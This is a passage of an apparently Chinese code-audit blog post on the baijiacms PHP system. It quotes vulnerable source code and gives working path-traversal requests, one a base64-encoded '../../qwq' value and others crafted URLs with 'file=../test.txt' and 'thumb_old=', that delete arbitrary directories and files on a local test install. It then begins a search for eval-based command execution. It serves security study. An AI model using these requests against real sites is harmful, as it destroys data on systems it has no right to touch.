single-quoted-string\">' where id=:id and type=3 and uniacid=:uniacid limit 1'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string single-quoted-string\">':id'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string single-quoted-string\">':uniacid'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$_W</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uniacid'</span><span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发现这里的id是直接赋值为0的，我们是不可控的，所以不存在注入。</p>\n<h3 id=\"任意目录及文件删除\"><a href=\"#任意目录及文件删除\" class=\"headerlink\" title=\"任意目录及文件删除\"></a>任意目录及文件删除</h3><p>关于漏洞寻找，大多是从一些敏感函数入手，如果觉得<code>Seay</code>扫描的不够全面，我们可自行查找，对于文件删除，我们这里首先想到的就是<code>unlink</code>函数，所以我们这里打开<code>Vscode</code>，<code>ctrl+shift+f</code>全局搜索<code>unlink</code>函数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533477.png\" alt=\"在这里插入图片描述\"><br>这里注意到有多个文件，<code>js</code>及<code>css</code>前端文件自不必看，我们这里要关注的是<code>php</code>文件，接下来从第一个开始看。</p>\n<h4 id=\"疑点一\"><a href=\"#疑点一\" class=\"headerlink\" title=\"疑点一\"></a>疑点一</h4><p>文件路由<code>baijiacms-master\\includes\\baijiacms\\common.inc.php</code>,涉及代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">rmdirs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$isdir</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//判定变量是否为目录</span>\n\t    <span class=\"token punctuation\">&#123;</span>\n\t            <span class=\"token variable\">$file_list</span><span class=\"token operator\">=</span> <span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//查看路径下的文件</span>\n\t            <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$file_list</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//依次遍历</span>\n\t            <span class=\"token punctuation\">&#123;</span>\n\t                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$file</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$file</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//如果不是.和..</span>\n\t                <span class=\"token punctuation\">&#123;</span>\n\t               \t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'qrcode'</span><span class=\"token punctuation\">)</span>\n\t               \t\t<span class=\"token punctuation\">&#123;</span>\n\t                    <span class=\"token function\">rmdirs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//删除目录下的文件</span>\n\t                  <span class=\"token punctuation\">&#125;</span>\n\t                <span class=\"token punctuation\">&#125;</span>\n\t            <span class=\"token punctuation\">&#125;</span>\n\t            \n\t    \t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token operator\">!=</span><span class=\"token constant\">WEB_ROOT</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/cache/'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//如果变量名不是根目录拼接cache</span>\n\t    \t<span class=\"token punctuation\">&#123;</span>\n\t            @<span class=\"token function\">rmdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//删除目录</span>\n\t               \n\t      <span class=\"token punctuation\">&#125;</span>    \n\t    <span class=\"token punctuation\">&#125;</span>\n\t    <span class=\"token keyword\">else</span>\n\t    <span class=\"token punctuation\">&#123;</span>\n\t        @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\t    <span class=\"token punctuation\">&#125;</span>\n\t \n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看到当它判定变量为目录时，会对目录下的文件进行递归，而后删除一切文件，如果它不是目录，那么他此时就会直接删除这个文件。接下来有函数了，那我们就要看哪个文件利用了这个函数，然后来进行利用。<br>所以接下来全局搜索函数<code>rmdirs</code><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533531.png\" alt=\"在这里插入图片描述\"><br>在文件<code>baijiacms-master\\system\\manager\\class\\web\\database.php</code>中发现如下代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\t\t\t\t <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$operation</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'delete'</span><span class=\"token punctuation\">)</span>\n <span class=\"token punctuation\">&#123;</span>\n \t\t<span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GP</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n \t\t\t<span class=\"token variable\">$path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">WEB_ROOT</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/config/data_backup/'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token function\">rmdirs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token function\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'备份删除成功！'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'site'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'manager'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'database'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'restore'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'success'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现这里对变量进行了<code>base64_decode</code>处理，这下我们想删除的目录的话，我们首先需要对他进行一个base64编码，同时我们可以看到这里指定了路径</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">WEB_ROOT</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/config/data_backup/'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但这个我们其实是可以绕过的，后续只校验了是不是目录，而未限定目录，所以我们通过burpsuite抓包修改目录就可以实现任意目录删除。</p>\n<p>接下来进行利用尝试<br>首先我们在根目录下新建一个目录（名字随便，我这里为qwq）<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533566.png\" alt=\"在这里插入图片描述\"><br>接下来访问这个数据库备份界面，具体路由如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=restore&amp;beid=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533718.png\" alt=\"在这里插入图片描述\"><br>开启bp抓包，点击删除功能点。发送到重放包界面，修改id为<code>Li4vLi4vcXdx</code>(../../qwq的Base64编码形式)<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533776.png\" alt=\"在这里插入图片描述\"><br>此时再回根目录查看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533228.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"疑点二\"><a href=\"#疑点二\" class=\"headerlink\" title=\"疑点二\"></a>疑点二</h4><p>除了<code>rmdir</code>和<code>unlink</code>，我们常常还可以关注<code>delete</code>函数，因为他直译过来也是删除的意思，所以接下来就全局进行搜索<code>delete()</code><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533549.png\" alt=\"在这里插入图片描述\"><br>而后在<code>includes\\baijiacms\\common.inc.php</code>中发现相关代码，具体代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">file_delete</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_relative_path</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_relative_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\n\t<span class=\"token variable\">$settings</span><span class=\"token operator\">=</span><span class=\"token function\">globaSystemSetting</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$settings</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'system_isnetattach'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$settings</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'system_isnetattach'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token constant\">WEB_ROOT</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/includes/lib/lib_ftp.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$ftp</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">baijiacms_ftp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$ftp</span><span class=\"token operator\">-></span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ftp</span><span class=\"token operator\">-></span><span class=\"token function\">ftp_delete</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$settings</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'system_ftp_ftproot'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token variable\">$file_relative_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span> \n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$settings</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'system_isnetattach'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token constant\">WEB_ROOT</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/includes/lib/lib_oss.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$oss</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">baijiacms_oss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$oss</span><span class=\"token operator\">-></span><span class=\"token function\">deletefile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_relative_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span>\n<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">SYSTEM_WEBROOT</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/attachment/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$file_relative_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">SYSTEM_WEBROOT</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/attachment/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$file_relative_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里重点关注这一个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$settings</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'system_isnetattach'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>当这个执行通过时，就不会去删除，反之，直接将文件删除，因此我们有必要去找一下这个是什么东西，照旧，全局搜索<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533421.png\" alt=\"在这里插入图片描述\"><br>这里发现是远程附件，因此我们这里选择本地的话，按理说就可直达<code>else</code>，对文件进行直接删除，访问具体路由</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=manager&amp;do=netattach&amp;beid=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533314.png\" alt=\"在这里插入图片描述\"><br>接下来就设置好了，接下来去寻找运用了这个<code>file_delete</code>函数的文件，全局搜索一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533447.png\" alt=\"在这里插入图片描述\"><br>文件路由为<code>system\\eshop\\core\\mobile\\util\\uploader.php</code>，部分代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$operation</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'remove'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GPC</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">file_delete</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">show_json</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>因此我们这里访问这个路由并设置<code>operation </code>为<code>remove</code>，按理说就可以直接删文件了，接下来尝试利用。</p>\n<p>首先在根目录新建文件，这里命名为<code>qwq.txt</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533700.png\" alt=\"在这里插入图片描述\"><br>接下来访问路由</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/baijiacms-master/index.php?mod=mobile&amp;act=uploader&amp;do=util&amp;m=eshop&amp;op=remove&amp;file=../test.txt</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533821.png\" alt=\"在这里插入图片描述\"><br>此时查看根目录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533918.png\" alt=\"在这里插入图片描述\"><br>文件已成功删除</p>\n<p>同时，我们刚刚还看到了不止这一个文件利用了<code>delete</code>函数，另外的是否存在呢，我们来看一下<br>文件路由<code>system\\eshop\\core\\web\\shop\\category.php</code>，具体代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$operation</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'post'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token operator\">...</span>\n\t\t<span class=\"token operator\">...</span>\n\t\t<span class=\"token operator\">...</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'parentid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">pdo_update</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'eshop_category'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$id</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            \n            <span class=\"token function\">file_delete</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GPC</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'thumb_old'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里可以发现想删除文件，需要有三个条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、<span class=\"token variable\">$operation</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'post'</span>\n<span class=\"token number\">2</span>、<span class=\"token variable\">$id</span>不为空\n<span class=\"token number\">3</span>、<span class=\"token variable\">$_GPC</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'thumb_old'</span><span class=\"token punctuation\">]</span>为具体文件名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>所以我们按理说的话，我们去访问这个路由，然后修改<code>$operation</code>为<code>post</code>，添加参数<code>$id=1</code>，同时附加参数<code>$thumb_old</code>为想删除文件名即可实现删除文件，这个<code>$operation</code>在前面可以看到其实是参数<code>op</code><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533034.png\" alt=\"在这里插入图片描述\"><br>所以我们直接给<code>op</code>赋值为<code>post</code>，即可实现文件删除，接下来进行尝试</p>\n<p>在根目录新建文件<code>qwq2.txt</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533086.png\" alt=\"在这里插入图片描述\"><br>接下来访问路由</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=category&amp;op=post&amp;do=shop&amp;m=eshop&amp;beid=2&amp;id=1&amp;thumb_old=../qwq.txt</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时即可实现删除文件</p>\n<h3 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h3><p>针对命令执行，我们关注的函数肯定是<code>eval</code>、<code>system</code>、<code>exec</code>这几个，所以接下来就尝试去利用Vscode的全局搜索来寻找可疑点。<br>首先搜索的是<code>eval</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533222.png\" alt=\"在这里插入图片描述\"><br>找到的大多数是带有eval的关键词而非<code>eval</code>函数，只有寥寥几个文件涉及了eval函数，接下来进行简单分析</p>\n<h4 id=\"疑点一（失败）-1\"><a href=\"#疑点一（失败）-1\" class=\"headerlink\" title=\"疑点一（失败）\"></a>疑点一（失败）</h4><p>文件路由<code>baijiacms-master\\system\\shopwap\\template\\mobile\\login_dingtalk_pc.php</code>，部分代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">function checkstatus()&#123;\n$.get(\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mobile'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'dingtalk'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'fastlogin_pc'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'dologincheck'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'skey'</span><span class=\"token operator\">=></span><span class=\"token variable\">$showkey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\", &#123;&#125;, function(data)&#123;\nvar data= eval(\"(\" + data + \")\");\n\n  if(data.status==1)\n  &#123;\n location.href=\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mobile'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'dingtalk'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'fastlogin_pc'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'tologin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'skey'</span><span class=\"token operator\">=></span><span class=\"token variable\">$showkey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";\n  &#125;\n  if(data.status==-1)\n  &#123;\n  alert(\"登录失败！重新刷新二维码登录\");\t\n  location.href=\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mobile'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'shopwap'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">,</span><span class=\"token 